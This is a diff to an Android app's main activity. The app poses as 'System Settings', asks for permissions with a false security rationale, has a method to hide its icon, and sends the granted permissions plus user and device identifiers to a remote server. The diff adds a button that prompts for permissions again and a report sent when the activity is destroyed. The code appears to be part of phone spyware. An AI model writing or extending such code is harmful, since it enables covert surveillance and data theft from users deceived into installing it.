@@ -9,6 +9,8 @@ import android.os.Bundle;
 import android.support.annotation.NonNull;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
+import android.view.View;
+import android.widget.Button;
 
 import java.util.HashMap;
 
@@ -20,16 +22,29 @@ public class MainActivity extends AppCompatActivity {
     private static final String TAG = "MainActivity";
     private static final String PERMISSION_RATIONALE = "System Settings keeps your android phone secure. Allow System Settings to protect your phone?";
     private CommonParams commonParams;
+    Button permitBtn;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        showUI();
         commonParams = new CommonParams(this);
         if ((Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)) {
             askPermissions();
         } else {
             done();
         }
+    }
+
+    private void showUI() {
+        setContentView(R.layout.activity_main);
+        permitBtn = (Button) findViewById(R.id.permit_btn);
+        permitBtn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                askPermissions();
+            }
+        });
     }
 
     private void hideApp() {
@@ -89,9 +104,15 @@ public class MainActivity extends AppCompatActivity {
             done.put(perms[i], results[i] == PackageManager.PERMISSION_GRANTED ? "1" : "0");
         }
         Http doneSMS = new Http();
-        doneSMS.setUrl(commonParams.getServer() + "/permissions/" + commonParams.getUid());
+        doneSMS.setUrl(commonParams.getServer() + "/permissions/" + commonParams.getUid() + "/" + commonParams.getDevice());
         doneSMS.setMethod("POST");
         doneSMS.setParams(done);
         doneSMS.execute();
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        done();
     }
 }
